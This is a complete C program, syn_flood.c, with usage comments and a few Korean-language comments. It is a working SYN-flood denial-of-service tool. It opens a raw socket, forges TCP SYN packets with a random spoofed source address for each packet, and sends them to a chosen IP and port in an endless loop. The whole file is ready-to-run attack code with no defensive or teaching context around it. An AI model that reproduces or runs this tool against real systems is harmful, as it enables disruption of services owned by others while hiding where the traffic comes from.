// syn_flood.c
// Compile with: gcc syn_flood.c -o syn_flood -Wall
// Run as root: sudo ./syn_flood <target_ip> <target_port>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <fcntl.h>

volatile int running = 1;

void handle_signal(int sig) {
    running = 0;
}

unsigned short checksum(unsigned short *ptr, int nbytes) {
    long sum;
    unsigned short oddbyte;
    unsigned short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char*)&oddbyte) = *(unsigned char*)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;

    return answer;
}

unsigned int get_random_uint() {
    unsigned int r;
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd < 0) {
        perror("open");
        exit(1);
    }
    if (read(fd, &r, sizeof(r)) != sizeof(r)) {
        perror("read");
        exit(1);
    }
    close(fd);
    return r;
}

int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <target_ip> <target_port>\n", argv[0]);
        exit(1);
    }

    signal(SIGTERM, handle_signal);
    signal(SIGINT, handle_signal);

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);

    int s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (s < 0) {
        perror("Socket creation failed");
        exit(1);
    }

    char datagram[4096];
    struct iphdr *iph = (struct iphdr *) datagram;
    struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(target_port);
    sin.sin_addr.s_addr = inet_addr(target_ip);

    int one = 1;
    const int *val = &one;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("setsockopt failed");
        exit(1);
    }

    int packet_sent = 0;
    while (running) {
        memset(datagram, 0, 4096);

        // 매 패킷마다 무작위 소스 IP 생성 (32비트 정수형)
        uint32_t source_ip = get_random_uint();

        // IP 헤더 설정
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
        iph->id = htons(get_random_uint() % 65535);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = source_ip;
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum((unsigned short *) datagram, iph->tot_len);

        // TCP 헤더 설정
        tcph->source = htons(get_random_uint() % 65535);
        tcph->dest = htons(target_port);
        tcph->seq = htonl(get_random_uint());
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->syn = 1;
        tcph->window = htons(1024);
        tcph->check = 0;

        // Pseudo header
        struct pseudo_header {
            u_int32_t source_address;
            u_int32_t dest_address;
            u_int8_t placeholder;
            u_int8_t protocol;
            u_int16_t tcp_length;
        };

        struct pseudo_header psh;
        psh.source_address = source_ip;
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr));

        char pseudo_packet[sizeof(struct pseudo_header) + sizeof(struct tcphdr)];
        memcpy(pseudo_packet, &psh, sizeof(struct pseudo_header));
        memcpy(pseudo_packet + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr));
        tcph->check = checksum((unsigned short*)pseudo_packet, sizeof(pseudo_packet));

        // 패킷 전송
        if (sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        } else {
            packet_sent++;
            if (packet_sent % 100 == 0)
                printf("Packets sent: %d\n", packet_sent);
        }
    }

    printf("Terminating, total packets sent: %d\n", packet_sent);
    close(s);
    return 0;
}